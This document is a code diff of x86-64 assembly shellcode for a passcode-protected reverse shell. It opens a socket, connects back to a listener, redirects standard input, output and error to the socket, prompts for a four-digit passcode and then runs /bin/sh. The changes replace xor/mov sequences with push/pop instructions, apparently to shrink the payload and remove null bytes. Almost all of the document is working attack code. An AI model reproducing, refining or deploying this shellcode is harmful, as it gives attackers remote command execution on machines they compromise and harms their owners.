@@ -3,6 +3,7 @@
 ; connect back shell or reverse bind shell
 ; create passcode auth
 ; remove the nulls later
+; shrink code 
 
 section .text
         global _start
@@ -24,13 +25,19 @@ _start:
         ; SOCK_STREAM = 1
 
         ; syscall number 41
-        xor rax, rax
-        mov al, 41              ; syscall
-        xor rdi, rdi
-        add di, 2               ; domain
-        xor rsi, rsi
-        inc rsi
-        xor rdx, rdx
+;        xor rax, rax
+ ;       mov al, 41              ; syscall
+	push byte 41
+	pop rax
+;        xor rdi, rdi
+ ;       add di, 2               ; domain
+	push byte 2
+	pop rdi
+;        xor rsi, rsi
+ ;       inc rsi
+	push byte 1
+	pop rsi
+        xor edx, edx
         syscall
                                 ; socket descriptor returned in rax
         ; copy socket descriptor to rdi for future use
@@ -42,7 +49,7 @@ _start:
         ; server.sin_port = htons(PORT)
         ; server.sin_addr.s_addr = INADDR_ANY
         ; bzero(&server.sin_zero, 8)
-        xor rax, rax                            ; init eight bytes to 0
+        xor eax, eax                            ; init eight bytes to 0
         push rax                                ; 0x0000 0000 0000 0000
 
         mov dword [rsp-4], eax                  ; 0x0000 0000
@@ -54,12 +61,16 @@ _start:
         ;               rdi                      rsi                  rdx
         ; syscall number 42
         ; connect
-        xor rax, rax
-        mov al, 42                              ; syscall connect
+;        xor rax, rax
+ ;       mov al, 42                              ; syscall connect
+	push byte 42
+	pop rax
         ; rdi                                   ; sockfd
         mov rsi, rsp                            ; 0x0000 0000 5c11 0002
-        xor rdx, rdx
-        add dl, 16                              ; length of 16 byes or 32 bits for IPv4
+;        xor rdx, rdx
+ ;       add dl, 16                              ; length of 16 byes or 32 bits for IPv4
+	push byte 16
+	pop rdx 
         syscall
 
 
@@ -73,25 +84,35 @@ _start:
         ; The dup2() system call performs the same task as dup(), but instead of using the lowest-numbered unused file descriptor, it uses the descriptor number spec
         ; -ified in newfd.  If the descriptor newfd was previously open, it is silently closed before being reused.
         ; dup2 (new, old)
-        xor rax, rax
-        add al, 33
+        ;xor rax, rax
+        ;add al, 33
+	push byte 33
+	pop rax
         ; rdi
-        xor rsi, rsi
+        xor esi, esi
         syscall
 
-        xor rax, rax
-        add al, 33
+        ;xor rax, rax
+        ;add al, 33
+	push byte 33
+	pop rax
         ; rdi
-        xor rsi, rsi
-        inc rsi
+;        xor rsi, rsi
+ ;       inc rsi
+	push byte 1
+	pop rsi 
         syscall
 
-        xor rax, rax
-        add al, 33
+        ;xor rax, rax
+        ;add al, 33
+	push byte 33
+	pop rax
         ; rdi
-        xor rsi, rsi
-        inc rsi
-        inc rsi
+        xor esi, esi
+        ;inc rsi
+        ;inc rsi
+	push byte 2
+	pop rsi 
         ;mov rsi, 2             ; newfd = std error
         syscall
 
@@ -110,22 +131,21 @@ _start:
         push rbx
         push rcx
 
-        xor rax, rax
-        xor rdx, rdx
-        mov al, 1
-        xor rdx, rdx
-        add dl, 1
-        mov rsi, rsp
-        mov dl, 25                      ; $ echo "Enter 4 digit passcode: " | wc = 25
-        syscall
+	push byte 1
+	pop rax				; syscall write        
+	mov rdi, r9			; sockfd
+        mov rsi, rsp			; buffer
+	push byte 25
+	pop rdx				; $ echo "Enter 4 digit passcode: " | wc = 25
+	syscall
         ; *******************************************************
 
         ; *****get passcode **************************************
-        xor rax, rax                    ; you can use read 0 | recvfrom 45 | recvmsg 47
+        xor eax, eax                    ; you can use read 0 | recvfrom 45 | recvmsg 47
         mov rdi, r9                     ; sockfd
         mov rsi, rsp                    ; buffer - put it on the stack
-        xor rdx, rdx
-        mov dl, 4                       ; len
+	push byte 4			; len
+	pop rdx
 ;       the items below are for using recvfrom | recvmsg
 ;       xor rcx, rcx                    ; flags
 ;       xor r8, r8                      ; null
@@ -139,9 +159,9 @@ _start:
         ; ***************************************************************************************
 _exit:
         ; _exit if wrong passcode ; alternatively, continue to ask for passcode
-        xor rax, rax
-        mov al, 60
-        xor rdi, rdi
+	push byte 60
+	pop rax
+        xor edi, edi
         syscall
         ; *******************************************************
 
@@ -149,7 +169,7 @@ _shell:
 
         ; execve *************************************
         ; First NULL push
-        xor rax, rax
+        xor eax, eax
         push rax
 
         ; push /bin//sh in reverse
@@ -172,6 +192,8 @@ _shell:
         mov rsi, rsp
 
         ; Call the Execve syscall
-        xor rax, rax
-        add al, 59
+;        xor rax, rax
+ ;       add al, 59
+	push byte 59
+	pop rax
         syscall
